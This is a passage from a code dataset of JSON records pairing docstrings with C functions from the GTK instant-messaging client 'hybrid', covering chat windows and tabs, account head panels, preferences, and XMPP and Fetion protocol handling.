trans->data_size, buf, n);\n        trans->data_size += n;\n    }\n\n    return TRUE;\n\npt_fin:\n    g_free(trans->data);\n    g_free(trans);\n\n    return FALSE;\n}", "path": "modules\\fetion\\fx_buddy.c", "repo_name": "levin108/hybrid", "stars": 110, "license": "gpl-2.0", "language": "c", "size": 1092}
{"docstring": "/**\n * Create the buddy tips panel. We implement it with GtkCellView.\n * The layout is:\n *\n * -----------------------------------------------------\n * |         | Name                  |  Proto | Status |\n * |  Icon   |--------------(markup)-|  Icon  |  Icon  |\n * | (32\u00d732) | Mood phrase           | (16\u00d716)| (16\u00d716)|\n * -----------------------------------------------------\n */\n", "func_signal": "static void\ncreate_buddy_tips_panel(GtkWidget *vbox, HybridChatWindow *chat)", "code": "{\n    GtkWidget       *cellview;\n    GtkListStore    *store;\n    GtkCellRenderer *renderer;\n    GtkTreePath     *path;\n    HybridAccount   *account;\n    HybridModule    *proto;\n    HybridBuddy     *buddy;\n    gchar           *name_text;\n    gchar           *mood_text;\n    GdkPixbuf       *icon_pixbuf;\n    GdkPixbuf       *proto_pixbuf;\n    GdkPixbuf       *presence_pixbuf;\n    GtkWidget       *eventbox;\n\n    g_return_if_fail(vbox != NULL);\n\n\n    cellview = gtk_cell_view_new();\n\n    store = gtk_list_store_new(LABEL_COLUMNS,\n                               GDK_TYPE_PIXBUF,\n                               G_TYPE_STRING,\n                               GDK_TYPE_PIXBUF,\n                               GDK_TYPE_PIXBUF);\n\n    gtk_cell_view_set_model(GTK_CELL_VIEW(cellview), GTK_TREE_MODEL(store));\n\n    /*\n     * GtkCellView doesn't have a GdkWindow, we wrap it with an EventBox,\n     * and then setup tooltip on the EventBox.\n     */\n    eventbox = gtk_event_box_new();\n    gtk_event_box_set_visible_window(GTK_EVENT_BOX(eventbox), FALSE);\n    gtk_container_add(GTK_CONTAINER(eventbox), cellview);\n\n    /* buddy icon renderer */\n    renderer = gtk_cell_renderer_pixbuf_new();\n    gtk_cell_layout_pack_start(GTK_CELL_LAYOUT(cellview), renderer, FALSE);\n    gtk_cell_layout_set_attributes(GTK_CELL_LAYOUT(cellview), renderer,\n            \"pixbuf\", BUDDY_ICON_COLUMN, NULL);\n    g_object_set(renderer, \"yalign\", 0.5, \"xpad\", 3, \"ypad\", 0, NULL);\n\n    /* buddy name renderer */\n    renderer = gtk_cell_renderer_text_new();\n    gtk_cell_layout_pack_start(GTK_CELL_LAYOUT(cellview), renderer, TRUE);\n    gtk_cell_layout_set_attributes(GTK_CELL_LAYOUT(cellview), renderer,\n            \"markup\", BUDDY_NAME_COLUMN, NULL);\n    g_object_set(renderer, \"xalign\", 0.0, \"xpad\", 6, \"ypad\", 0, NULL);\n    g_object_set(renderer, \"ellipsize\", PANGO_ELLIPSIZE_END, NULL);\n\n    /* protocol icon renderer */\n    renderer = gtk_cell_renderer_pixbuf_new();\n    gtk_cell_layout_pack_start(GTK_CELL_LAYOUT(cellview), renderer, FALSE);\n    gtk_cell_layout_set_attributes(GTK_CELL_LAYOUT(cellview), renderer,\n            \"pixbuf\", BUDDY_PROTO_ICON_COLUMN, NULL);\n    g_object_set(renderer, \"xalign\", 0.0, \"xpad\", 6, \"ypad\", 0, NULL);\n\n    /* status icon renderer */\n    renderer = gtk_cell_renderer_pixbuf_new();\n    gtk_cell_layout_pack_start(GTK_CELL_LAYOUT(cellview), renderer, FALSE);\n    gtk_cell_layout_set_attributes(GTK_CELL_LAYOUT(cellview), renderer,\n            \"pixbuf\", BUDDY_STATUS_ICON_COLUMN, NULL);\n    g_object_set(renderer, \"xalign\", 0.0, \"xpad\", 6, \"ypad\", 0, NULL);\n\n    gtk_list_store_append(store, &chat->tipiter);\n    path = gtk_tree_path_new_from_string(\"0\");\n    gtk_cell_view_set_displayed_row(GTK_CELL_VIEW(cellview), path);\n    gtk_tree_path_free(path);\n\n    chat->tiplabel = cellview;\n\n    if (IS_SYSTEM_CHAT(chat)) {\n\n        buddy = chat->data;\n        hybrid_tooltip_setup(eventbox, NULL, NULL, init_tooltip, buddy);\n\n        icon_pixbuf = hybrid_create_round_pixbuf(buddy->icon_data,\n                        buddy->icon_data_length, 32);\n\n        presence_pixbuf = hybrid_create_presence_pixbuf(buddy->state, 16);\n\n        mood_text = g_markup_escape_text(buddy->mood ? buddy->mood : \"\", -1);\n\n        name_text = g_strdup_printf(\n                \"<b>%s</b>\\n<small><span font=\\\"#8f8f8f\\\">%s</span></small>\",\n                buddy->name && *(buddy->name) != '\\0' ? buddy->name : buddy->id,\n                mood_text);\n\n        gtk_list_store_set(store, &chat->tipiter,\n                           BUDDY_ICON_COLUMN, icon_pixbuf,\n                           BUDDY_NAME_COLUMN, name_text,\n                           BUDDY_STATUS_ICON_COLUMN, presence_pixbuf, -1);\n\n        g_object_unref(icon_pixbuf);\n        g_object_unref(presence_pixbuf);\n\n        g_free(name_text);\n        g_free(mood_text);\n    }\n\n    account = chat->account;\n    proto   = account->proto;\n\n    proto_pixbuf = hybrid_create_proto_icon(proto->info->name, 16);\n\n    gtk_list_store_set(store, &chat->tipiter,\n                    BUDDY_PROTO_ICON_COLUMN, proto_pixbuf, -1);\n\n    g_object_unref(proto_pixbuf);\n\n    gtk_box_pack_start(GTK_BOX(vbox), eventbox, FALSE, FALSE, 5);\n}", "path": "src\\conv.c", "repo_name": "levin108/hybrid", "stars": 110, "license": "gpl-2.0", "language": "c", "size": 1092}
{"docstring": "/**\n * Close a single tab.\n */\n", "func_signal": "static void\nclose_tab(HybridChatWindow *chat)", "code": "{\n    HybridConversation *conv;\n    gint                page_index;\n\n    g_return_if_fail(chat != NULL);\n\n    conv = chat->parent;\n\n    page_index = gtk_notebook_page_num(GTK_NOTEBOOK(conv->notebook),\n            chat->vbox);\n    gtk_notebook_remove_page(GTK_NOTEBOOK(conv->notebook), page_index);\n\n    conv->chat_buddies = g_slist_remove(conv->chat_buddies, chat);\n\n    if (g_slist_length(conv->chat_buddies) == 1) {\n        /*\n         * We don't want to show the tabs any more\n         * when we have only one tab left.\n         */\n        gtk_notebook_set_show_tabs(GTK_NOTEBOOK(conv->notebook), FALSE);\n    }\n\n    /* TODO inplement a chat_window_destroy(). */\n    if (chat->input_source) {\n        g_source_remove(chat->input_source);\n    }\n    g_free(chat->title);\n    g_free(chat);\n\n    if (conv->chat_buddies == NULL) {\n\n       /*\n        * Now we need to destroy the conversation window.\n        * NOTE: We don't have to free the resource here,\n        *       it will be done in the callback function\n        *       of the window-destroy event.\n        */\n        gtk_widget_destroy(conv->window);\n    }\n\n}", "path": "src\\conv.c", "repo_name": "levin108/hybrid", "stars": 110, "license": "gpl-2.0", "language": "c", "size": 1092}
{"docstring": "/**\n * Scribe the presence information of the roster by\n * sending a <presence/> label to the server.\n */\n", "func_signal": "static void\nxmpp_buddy_presence(XmppStream *stream)", "code": "{\n    xmlnode       *node;\n    gchar         *xml_string;\n    HybridAccount *account;\n\n    g_return_if_fail(stream != NULL);\n\n    account = stream->account->account;\n\n    node = xmlnode_create(\"presence\");\n\n    xml_string = xmlnode_to_string(node);\n\n    hybrid_debug_info(\"xmpp\", \"subscribe presence,send:\\n%s\", xml_string);\n\n    if (hybrid_ssl_write(stream->ssl, xml_string, strlen(xml_string)) == -1) {\n\n        hybrid_account_error_reason(stream->account->account,\n                                    _(\"subscribe presence failed\"));\n        g_free(xml_string);\n\n        return;\n    }\n\n    g_free(xml_string);\n\n    xmpp_account_modify_status(stream, account->state,\n                               account->status_text);\n}", "path": "modules\\xmpp\\xmpp_buddy.c", "repo_name": "levin108/hybrid", "stars": 110, "license": "gpl-2.0", "language": "c", "size": 1092}
{"docstring": "/**\n * Initialize the chat panel.\n */\n", "func_signal": "static void\ninit_chat_window(HybridChatWindow *chat)", "code": "{\n    GtkWidget          *vbox;\n    HybridConversation *conv;\n    gint                page_index;\n\n    g_return_if_fail(chat != NULL);\n\n    conv = chat->parent;\n\n    if (g_slist_length(conv->chat_buddies) == 1) {\n        gtk_notebook_set_show_tabs(GTK_NOTEBOOK(conv->notebook), FALSE);\n\n    } else {\n        gtk_notebook_set_show_tabs(GTK_NOTEBOOK(conv->notebook), TRUE);\n    }\n\n    vbox = gtk_vbox_new(FALSE, 0);\n    gtk_container_set_border_width(GTK_CONTAINER(vbox), 4);\n    chat->vbox = vbox;\n\n    chat->pagelabel = create_note_label(chat);\n    page_index = gtk_notebook_append_page(GTK_NOTEBOOK(conv->notebook), vbox,\n            chat->pagelabel);\n    gtk_notebook_set_tab_reorderable(GTK_NOTEBOOK(conv->notebook), vbox, TRUE);\n    gtk_notebook_set_tab_detachable(GTK_NOTEBOOK(conv->notebook), vbox, TRUE);\n    gtk_notebook_set_tab_label_packing(GTK_NOTEBOOK(conv->notebook),\n            vbox, TRUE, TRUE, GTK_PACK_START);\n\n    init_chat_window_body(vbox, chat);\n\n    /*\n     * The function should stay here. Because of the following reason:\n     *\n     * Note that due to historical reasons, GtkNotebook refuses to\n     * switch to a page unless the child widget is visible.\n     *                                ---- GtkNotebook\n     */\n    gtk_notebook_set_current_page(GTK_NOTEBOOK(conv->notebook), page_index);\n\n    /* focus the send textview */\n    gtk_widget_grab_focus(chat->sendtext);\n}", "path": "src\\conv.c", "repo_name": "levin108/hybrid", "stars": 110, "license": "gpl-2.0", "language": "c", "size": 1092}
{"docstring": "/**\n * Hide the info panel and show the edit box.\n */\n", "func_signal": "static void\nshow_edit_box(gint edit_type)", "code": "{\n    const gchar *markup;\n    HybridAccount *account;\n\n    /*\n     * Be sure there's at least one account was enable.\n     */\n    if (!(account = hybrid_blist_get_current_account())) {\n        return;\n    }\n\n    hybrid_head->edit_account = account;\n    hybrid_head->edit_state = edit_type;\n\n    switch (edit_type) {\n        case HYBRID_HEAD_EDIT_NAME:\n\n            markup = _(\"<b>Please input the name:</b>\");\n\n            if (account->nickname) {\n                gtk_entry_set_text(GTK_ENTRY(hybrid_head->edit_entry),\n                        account->nickname);\n            }\n\n            break;\n        case HYBRID_HEAD_EDIT_STATUS:\n\n            markup = _(\"<b>Please input the status:</b>\");\n\n            if (account->status_text) {\n                gtk_entry_set_text(GTK_ENTRY(hybrid_head->edit_entry),\n                        account->status_text);\n            }\n\n            break;\n        default:\n            return;\n    }\n\n\n    gtk_label_set_markup(GTK_LABEL(hybrid_head->edit_label), markup);\n\n    gtk_widget_hide(hybrid_head->eventbox);\n    gtk_widget_show(hybrid_head->editbox);\n\n    gtk_widget_grab_focus(hybrid_head->edit_entry);\n}", "path": "src\\head.c", "repo_name": "levin108/hybrid", "stars": 110, "license": "gpl-2.0", "language": "c", "size": 1092}
{"docstring": "/**\n * Callback funtion for initializing the data in the tooltip window.\n */\n", "func_signal": "static gboolean\ntooltip_init(HybridTooltipData *tip_data)", "code": "{\n    HybridAccount        *account;\n    HybridModule        *module;\n    HybridIMOps            *ops;\n\n    if ((account = hybrid_blist_get_current_account())) {\n\n        module = account->proto;\n        ops       = module->info->im_ops;\n\n        if (tip_data->icon) {\n            g_object_unref(tip_data->icon);\n        }\n\n        tip_data->icon = hybrid_create_round_pixbuf(\n                            account->icon_data,\n                            account->icon_data_len, PORTRAIT_WIDTH);\n\n        if (ops->account_tooltip) {\n            if (!ops->account_tooltip(account, tip_data)){\n\n                return FALSE;\n            }\n\n            return TRUE;\n        }\n    }\n\n    return FALSE;\n}", "path": "src\\head.c", "repo_name": "levin108/hybrid", "stars": 110, "license": "gpl-2.0", "language": "c", "size": 1092}
{"docstring": "/**\n * Callback function to handle the new-chat connecting event.\n * The message is:\n *\n * R fetion.com.cn SIP-C/4.0\n * F: 547264589\n * I: 5\n * Q: 2 R\n * A: TICKS auth=\"2051600954.830102111\"\n * K: text/html-fragment\n * K: multiparty\n * K: nudge\n */\n", "func_signal": "static gint\ninvite_connect_cb(gint sk, gpointer user_data)", "code": "{\n    fetion_transaction *trans;\n    fetion_account     *account;\n    fetion_sip         *sip;\n    invite_data        *data;\n    gchar              *credential;\n    gchar              *sip_text;\n\n    sip_header *aheader;\n    sip_header *theader;\n    sip_header *mheader;\n    sip_header *nheader;\n\n    data       = (invite_data*)user_data;\n    trans      = data->trans;\n    credential = data->credential;\n    account    = trans->data;\n\n    g_free(data);\n\n    sip = account->sip;\n    account->sk = sk;\n\n    /* listen for this thread */\n    account->source = hybrid_event_add(sk, HYBRID_EVENT_READ,\n                        hybrid_push_cb, account);\n\n    fetion_sip_set_type(sip, SIP_REGISTER);\n    aheader = sip_credential_header_create(credential);\n    theader = sip_header_create(\"K\", \"text/html-fragment\");\n    mheader = sip_header_create(\"K\", \"multiparty\");\n    nheader = sip_header_create(\"K\", \"nudge\");\n\n    transaction_set_callid(trans, sip->callid);\n    transaction_set_callback(trans, chat_reg_cb);\n    transaction_add(account, trans);\n\n    fetion_sip_add_header(sip, aheader);\n    fetion_sip_add_header(sip, theader);\n    fetion_sip_add_header(sip, mheader);\n    fetion_sip_add_header(sip, nheader);\n\n    sip_text = fetion_sip_to_string(sip, NULL);\n\n    hybrid_debug_info(\"fetion\", \"register, send:\\n%s\", sip_text);\n\n    if (send(sk, sip_text, strlen(sip_text), 0) == -1) {\n\n        hybrid_debug_error(\"fetion\", \"register to the new chat channel failed\");\n\n        return HYBRID_ERROR;\n    }\n\n    g_free(sip_text);\n    g_free(credential);\n\n    return HYBRID_OK;\n}", "path": "modules\\fetion\\fx_msg.c", "repo_name": "levin108/hybrid", "stars": 110, "license": "gpl-2.0", "language": "c", "size": 1092}
{"docstring": "/**\n * Callback function to handle the conversation window destroy event.\n */\n", "func_signal": "static void\nconv_destroy_cb(GtkWidget *widget, gpointer user_data)", "code": "{\n    HybridConversation *conv = (HybridConversation*)user_data;\n    GSList             *pos;\n    HybridChatWindow   *temp_chat;\n\n    /* First we should free the memory in the list of HybridChatWindow. */\n    while (conv->chat_buddies) {\n\n        pos = conv->chat_buddies;\n\n        temp_chat          = (HybridChatWindow*)pos->data;\n        conv->chat_buddies = g_slist_remove(conv->chat_buddies, temp_chat);\n\n        chat_window_destroy(temp_chat);\n    }\n\n    conv_list = g_slist_remove(conv_list, conv);\n    g_free(conv);\n}", "path": "src\\conv.c", "repo_name": "levin108/hybrid", "stars": 110, "license": "gpl-2.0", "language": "c", "size": 1092}
{"docstring": "/**\n * Callback function of the conversation window's key-press event.\n */\n", "func_signal": "static gboolean\nkey_press_func(GtkWidget *widget, GdkEventKey *event, HybridConversation *conv)", "code": "{\n    gint              current_page;\n    gint              pages;\n    GSList           *pos;\n    HybridChatWindow *chat;\n\n    if (event->state & GDK_CONTROL_MASK) {\n\n        /* CTRL+W close the chat tab. */\n        if (event->keyval == GDK_w) {\n\n            /* find the current chat panel. */\n            current_page = gtk_notebook_current_page(\n                    GTK_NOTEBOOK(conv->notebook));\n\n            for (pos = conv->chat_buddies; pos; pos = pos->next) {\n                chat = (HybridChatWindow*)pos->data;\n\n                if (current_page == gtk_notebook_page_num(\n                            GTK_NOTEBOOK(conv->notebook), chat->vbox)) {\n\n                    close_tab(chat);\n\n                    return TRUE;\n                }\n            }\n\n            hybrid_debug_error(\"conv\", \"FATAL, can't find chat panel\");\n\n            return FALSE;\n        }\n\n        /* CTRL+Q close the window. */\n        if (event->keyval == GDK_q) {\n\n            gtk_widget_destroy(conv->window);\n\n            return TRUE;\n        }\n\n        /* CTRL+TAB move to next page. */\n        if (event->keyval == GDK_Tab) {\n\n            pages = gtk_notebook_get_n_pages(GTK_NOTEBOOK(conv->notebook));\n\n            if (pages == 1) {\n\n                return TRUE;\n\n            } else {\n                current_page = gtk_notebook_current_page(\n                        GTK_NOTEBOOK(conv->notebook));\n\n                if (pages - 1 == current_page) {\n                    gtk_notebook_set_current_page(GTK_NOTEBOOK(conv->notebook), 0);\n\n                } else {\n                    gtk_notebook_next_page(GTK_NOTEBOOK(conv->notebook));\n                }\n            }\n\n            return TRUE;\n        }\n\n    }\n\n    return FALSE;\n}", "path": "src\\conv.c", "repo_name": "levin108/hybrid", "stars": 110, "license": "gpl-2.0", "language": "c", "size": 1092}
{"docstring": "/**\n * Create a new Hybrid Conversation Dialog.\n */\n", "func_signal": "static HybridConversation*\nhybrid_conv_create()", "code": "{\n    GtkWidget *vbox;\n    GtkWidget *action_area;\n    GtkWidget *halign;\n    GtkWidget *button;\n    gint       tab_pos;\n    gchar     *chat_theme = NULL;\n\n    theme_list[0].func();\n\n    if ((chat_theme = hybrid_pref_get_string(NULL, \"chat_theme\")) != NULL) {\n        gint i;\n        for (i = 0; theme_list[i].name; i ++) {\n            if (g_strcmp0(theme_list[i].name, chat_theme) == 0) {\n                theme_list[i].func();\n            }\n        }\n    }\n\n    HybridConversation *imconv;\n\n    imconv = g_new0(HybridConversation, 1);\n\n    /* create window */\n    imconv->window = gtk_window_new(GTK_WINDOW_TOPLEVEL);\n    gtk_window_set_default_size(GTK_WINDOW(imconv->window), 485, 500);\n    gtk_container_set_border_width(GTK_CONTAINER(imconv->window), 1);\n    g_signal_connect(imconv->window, \"destroy\", G_CALLBACK(conv_destroy_cb),\n                     imconv);\n    g_signal_connect(imconv->window, \"key-press-event\",\n                     G_CALLBACK(key_press_func), imconv);\n\n    /* create vbox */\n    vbox = gtk_vbox_new(FALSE, 2);\n    gtk_container_add(GTK_CONTAINER(imconv->window), vbox);\n\n    /* create notebook */\n    imconv->notebook = gtk_notebook_new();\n\n    if ((tab_pos = hybrid_pref_get_int(NULL, \"tab_pos\")) != -1) {\n        gtk_notebook_set_tab_pos(GTK_NOTEBOOK(imconv->notebook), tab_pos);\n\n    } else {\n        gtk_notebook_set_tab_pos(GTK_NOTEBOOK(imconv->notebook), GTK_POS_TOP);\n    }\n    gtk_notebook_set_scrollable(GTK_NOTEBOOK(imconv->notebook), TRUE);\n    gtk_notebook_popup_enable(GTK_NOTEBOOK(imconv->notebook));\n    gtk_notebook_set_show_tabs(GTK_NOTEBOOK(imconv->notebook), TRUE);\n    gtk_notebook_set_show_border(GTK_NOTEBOOK(imconv->notebook), TRUE);\n    gtk_box_pack_start(GTK_BOX(vbox), imconv->notebook, TRUE, TRUE, 0);\n    g_signal_connect(imconv->notebook, \"switch-page\",\n                     G_CALLBACK(switch_page_cb), imconv);\n\n    if (!hybrid_pref_get_boolean(NULL, \"hide_chat_buttons\")) {\n        /* create action area, \"Close\" button and \"Send\" button */\n        action_area = gtk_hbox_new(FALSE, 0);\n\n        halign = gtk_alignment_new(1, 0, 0, 0);\n        gtk_container_add(GTK_CONTAINER(halign), action_area);\n        gtk_box_pack_start(GTK_BOX(vbox), halign, FALSE, FALSE, 1);\n\n        button = gtk_button_new_with_label(_(\"Close\"));\n        gtk_widget_set_size_request(button, 100, 30);\n        gtk_box_pack_start(GTK_BOX(action_area), button, FALSE, FALSE, 2);\n        g_signal_connect(button, \"clicked\", G_CALLBACK(conv_close_cb), imconv);\n\n        button = gtk_button_new_with_label(_(\"Send\"));\n        gtk_widget_set_size_request(button, 100, 30);\n        gtk_box_pack_start(GTK_BOX(action_area), button, FALSE, FALSE, 1);\n        g_signal_connect(button, \"clicked\", G_CALLBACK(conv_send_cb), imconv);\n\n    }\n\n    gtk_widget_show_all(imconv->window);\n\n    return imconv;\n}", "path": "src\\conv.c", "repo_name": "levin108/hybrid", "stars": 110, "license": "gpl-2.0", "language": "c", "size": 1092}
{"docstring": "/**\n * Callback function to handle the close button click event.\n */\n", "func_signal": "static void\nconv_close_cb(GtkWidget *widget, gpointer user_data)", "code": "{\n    HybridConversation *conv;\n\n    conv = (HybridConversation*)user_data;\n\n    gtk_widget_destroy(conv->window);\n}", "path": "src\\conv.c", "repo_name": "levin108/hybrid", "stars": 110, "license": "gpl-2.0", "language": "c", "size": 1092}
{"docstring": "/**\n * Callback function of the text buffer changed event, to cal the number of words\n * left that can be input into the send textview.\n */\n", "func_signal": "static gboolean\nsendtext_buffer_changed(GtkTextBuffer *buffer, HybridChatWindow *chat)", "code": "{\n    GtkTextIter    startIter;\n    GtkTextIter    endIter;\n    gint           count;\n    gint           totel_count;\n    HybridAccount *account;\n    HybridModule  *module;\n    HybridIMOps   *ops;\n    gchar         *text;\n    gchar         *res;\n\n    account = chat->account;\n    module  = account->proto;\n    ops     = module->info->im_ops;\n\n    if (!chat->is_typing) {\n\n        if (IS_SYSTEM_CHAT(chat) && ops->chat_send_typing) {\n\n            chat->typing_source =\n                g_timeout_add_seconds(4, (GSourceFunc)type_finished_cb, chat);\n\n            chat->is_typing = TRUE;\n\n            ops->chat_send_typing(account, chat->data, INPUT_STATE_TYPING);\n        }\n    }\n\n    /* calculate number of words left to input. */\n    if (!chat->words_left_label) {\n        return FALSE;\n    }\n\n    if (!ops->chat_word_limit ||\n        (totel_count = ops->chat_word_limit(account)) <= 0) {\n\n        return FALSE;\n    }\n\n    count = gtk_text_buffer_get_char_count(buffer);\n\n    if (count <= totel_count){\n\n        text = g_strdup_printf(_(\"[<span color='#0099ff'>%d</span>] character\"),\n                               totel_count - count);\n        gtk_label_set_markup(GTK_LABEL(chat->words_left_label), text);\n        g_free(text);\n\n    } else {\n\n        gtk_text_buffer_get_start_iter(buffer, &startIter);\n        gtk_text_buffer_get_iter_at_offset(buffer, &endIter, totel_count);\n        res = gtk_text_buffer_get_text(buffer, &startIter, &endIter, totel_count);\n        gtk_text_buffer_set_text(buffer, res, strlen(res));\n        g_free(res);\n    }\n\n    return FALSE;\n}", "path": "src\\conv.c", "repo_name": "levin108/hybrid", "stars": 110, "license": "gpl-2.0", "language": "c", "size": 1092}
{"docstring": "/**\n * Create the tab label widget for the GtkNotebook.\n * The layout is:\n *\n * -----------------------------------------------------\n * | Status  |                     |   Close Button    |\n * |  Icon   | buddy name (markup) |                   |\n * | (16\u00d716) |                     |      (16\u00d716)      |\n * -----------------------------------------------------\n * |- GtkEventBox -> GtkCellView  -|--- GtkEventBox ---|\n */\n", "func_signal": "static GtkWidget*\ncreate_note_label(HybridChatWindow *chat)", "code": "{\n    GtkWidget       *hbox;\n    GtkWidget       *eventbox;\n    GtkWidget       *close_image;\n    GtkWidget       *label;\n    GtkListStore    *store;\n    GtkCellRenderer *renderer;\n    GtkTreePath     *path;\n    HybridBuddy     *buddy;\n    GdkPixbuf       *icon_pixbuf;\n\n    g_return_val_if_fail(chat != NULL, NULL);\n\n\n    hbox = gtk_hbox_new(FALSE, 0);\n\n    label = gtk_cell_view_new();\n\n    store = gtk_list_store_new(TAB_COLUMNS,\n            GDK_TYPE_PIXBUF,\n            G_TYPE_STRING);\n\n    gtk_cell_view_set_model(GTK_CELL_VIEW(label), GTK_TREE_MODEL(store));\n\n    g_object_unref(store);\n\n    /* buddy icon renderer */\n    renderer = gtk_cell_renderer_pixbuf_new();\n    gtk_cell_layout_pack_start(GTK_CELL_LAYOUT(label), renderer, FALSE);\n    gtk_cell_layout_set_attributes(GTK_CELL_LAYOUT(label), renderer,\n            \"pixbuf\", TAB_STATUS_ICON_COLUMN, NULL);\n    g_object_set(renderer, \"yalign\", 0.5, \"xpad\", 3, \"ypad\", 0, NULL);\n\n    /* buddy name renderer */\n    renderer = gtk_cell_renderer_text_new();\n    gtk_cell_layout_pack_start(GTK_CELL_LAYOUT(label), renderer, TRUE);\n    gtk_cell_layout_set_attributes(GTK_CELL_LAYOUT(label), renderer,\n            \"markup\", TAB_NAME_COLUMN, NULL);\n\n    g_object_set(renderer, \"xalign\", 0.5, \"xpad\", 6, \"ypad\", 0, NULL);\n    g_object_set(renderer, \"ellipsize\", PANGO_ELLIPSIZE_END, NULL);\n\n    chat->tablabel = label;\n    gtk_list_store_append(store, &chat->tabiter);\n    path = gtk_tree_path_new_from_string(\"0\");\n    gtk_cell_view_set_displayed_row(GTK_CELL_VIEW(label), path);\n    gtk_tree_path_free(path);\n\n    if (IS_SYSTEM_CHAT(chat)) {\n\n        buddy = chat->data;\n\n        icon_pixbuf = hybrid_create_presence_pixbuf(buddy->state, 16);\n\n        gtk_list_store_set(store, &chat->tabiter,\n                TAB_STATUS_ICON_COLUMN, icon_pixbuf, TAB_NAME_COLUMN,\n                buddy->name && *(buddy->name) != '\\0' ? buddy->name : buddy->id,\n                -1);\n\n        g_object_unref(icon_pixbuf);\n    }\n\n    eventbox = gtk_event_box_new();\n    gtk_event_box_set_visible_window(GTK_EVENT_BOX(eventbox), FALSE);\n    gtk_container_add(GTK_CONTAINER(eventbox), label);\n    gtk_box_pack_start(GTK_BOX(hbox), eventbox, TRUE, TRUE, 0);\n    gtk_widget_add_events(eventbox,\n            GDK_POINTER_MOTION_MASK | GDK_LEAVE_NOTIFY_MASK);\n    g_signal_connect(G_OBJECT(eventbox), \"button-press-event\",\n            G_CALLBACK(tab_press_cb), chat);\n\n    /* close button */\n    eventbox = gtk_event_box_new();\n    gtk_event_box_set_visible_window(GTK_EVENT_BOX(eventbox), FALSE);\n    close_image = gtk_image_new_from_file(PIXMAPS_DIR\"menus/close.png\");\n    g_signal_connect(G_OBJECT(eventbox), \"button-press-event\",\n            G_CALLBACK(tab_close_press_cb), chat);\n    gtk_container_add(GTK_CONTAINER(eventbox), close_image);\n\n    gtk_box_pack_start(GTK_BOX(hbox), eventbox, FALSE, FALSE, 0);\n\n    gtk_widget_show_all(hbox);\n\n    return hbox;\n}", "path": "src\\conv.c", "repo_name": "levin108/hybrid", "stars": 110, "license": "gpl-2.0", "language": "c", "size": 1092}
{"docstring": "/**\n * Initialize the sound settings panel.\n */\n", "func_signal": "static void\npref_sound_init(GtkWidget *tab)", "code": "{\n    GtkWidget *section = hybrid_pref_tab_add_section(tab, NULL);\n\n    hybrid_pref_section_add_entry(main_pref_window, section, PREF_KEY_BOOL,\n                                  _(\"Mute\"), \"mute\", _(\"Mute\"), NULL);\n}", "path": "src\\preference.c", "repo_name": "levin108/hybrid", "stars": 110, "license": "gpl-2.0", "language": "c", "size": 1092}
{"docstring": "/**\n * Callback function to handle the new_chat response message, if success\n * we would get the following message:\n *\n * SIP-C/4.0 200 OK\n * I: 4\n * Q: 2 S\n * A: CS address=\"221.176.31.128:8080;221.176.31.128:443\",credential=\"439333922.916967705\"\n *\n * Now we should start a new socket connect to 221.176.31.128:8080 with port 443 as\n * a back port if 8080 failed to connect.\n */\n", "func_signal": "gint\nnew_chat_cb(fetion_account *account, const gchar *sipmsg,\n            fetion_transaction *trans)", "code": "{\n    gchar              *auth;\n    gchar              *ip;\n    gint                port;\n    gchar              *credential;\n    invite_data        *data;\n    fetion_transaction *new_trans;\n    fetion_account     *new_account;\n\n    hybrid_debug_info(\"fetion\", \"%s\\n\", sipmsg);\n\n    if (!(auth = sip_header_get_attr(sipmsg, \"A\"))) {\n\n        hybrid_debug_error(\"fetion\", \"invalid invitation response.\");\n\n        return HYBRID_ERROR;\n    }\n\n    if (sip_header_get_auth(auth, &ip, &port, &credential) != HYBRID_OK) {\n\n        hybrid_debug_error(\"fetion\", \"invalid invitation response.\");\n\n        return HYBRID_ERROR;\n    }\n\n    g_free(auth);\n\n    new_trans = transaction_clone(trans);\n\n    new_account = fetion_account_clone(account);\n    fetion_account_set_who(new_account, trans->userid);\n\n    transaction_set_data(new_trans, new_account);\n\n    data = g_new0(invite_data, 1);\n    data->trans = new_trans;\n    data->credential = credential;\n\n    hybrid_proxy_connect(ip, port, invite_connect_cb, data);\n\n    g_free(ip);\n\n    return HYBRID_OK;\n}", "path": "modules\\fetion\\fx_msg.c", "repo_name": "levin108/hybrid", "stars": 110, "license": "gpl-2.0", "language": "c", "size": 1092}
{"docstring": "/**\n * Initialize the head cellview, create list store and set the cell renderers.\n */\n", "func_signal": "static void\ncell_view_init(HybridHead *head)", "code": "{\n    GtkListStore *store;\n    GtkCellRenderer *renderer;\n    GtkTreePath *path;\n\n    g_return_if_fail(head != NULL);\n\n    store = gtk_list_store_new(HYBRID_HEAD_COLUMNS,\n                                GDK_TYPE_PIXBUF,\n                                G_TYPE_STRING,\n                                GDK_TYPE_PIXBUF);\n\n    gtk_cell_view_set_model(GTK_CELL_VIEW(head->cellview), GTK_TREE_MODEL(store));\n\n    g_object_unref(store);\n\n    /* buddy icon renderer */\n    renderer = gtk_cell_renderer_pixbuf_new();\n    gtk_cell_layout_pack_start(GTK_CELL_LAYOUT(head->cellview), renderer, FALSE);\n    gtk_cell_layout_set_attributes(GTK_CELL_LAYOUT(head->cellview), renderer,\n            \"pixbuf\", HYBRID_HEAD_PIXBUF_COLUMN, NULL);\n    g_object_set(renderer, \"yalign\", 0.5, \"xpad\", 3, \"ypad\", 0, NULL);\n\n    /* buddy name renderer */\n    renderer = gtk_cell_renderer_text_new();\n    gtk_cell_layout_pack_start(GTK_CELL_LAYOUT(head->cellview), renderer, TRUE);\n    gtk_cell_layout_set_attributes(GTK_CELL_LAYOUT(head->cellview), renderer,\n            \"markup\", HYBRID_HEAD_NAME_COLUMN, NULL);\n\n    g_object_set(renderer, \"xalign\", 0.0, \"yalign\", 0.0, \"xpad\", 6, \"ypad\", 0, NULL);\n    g_object_set(renderer, \"ellipsize\", PANGO_ELLIPSIZE_END, NULL);\n\n    /* status icon renderer */\n    renderer = gtk_cell_renderer_pixbuf_new();\n    gtk_cell_layout_pack_start(GTK_CELL_LAYOUT(head->cellview), renderer, FALSE);\n    gtk_cell_layout_set_attributes(GTK_CELL_LAYOUT(head->cellview), renderer,\n            \"pixbuf\", HYBRID_HEAD_STATUS_ICON_COLUMN, NULL);\n    g_object_set(renderer, \"yalign\", 0.5, \"xpad\", 10, \"ypad\", 0, NULL);\n\n    gtk_list_store_append(store, &head->iter);\n    path = gtk_tree_path_new_from_string(\"0\");\n    gtk_cell_view_set_displayed_row(GTK_CELL_VIEW(head->cellview), path);\n    gtk_tree_path_free(path);\n}", "path": "src\\head.c", "repo_name": "levin108/hybrid", "stars": 110, "license": "gpl-2.0", "language": "c", "size": 1092}
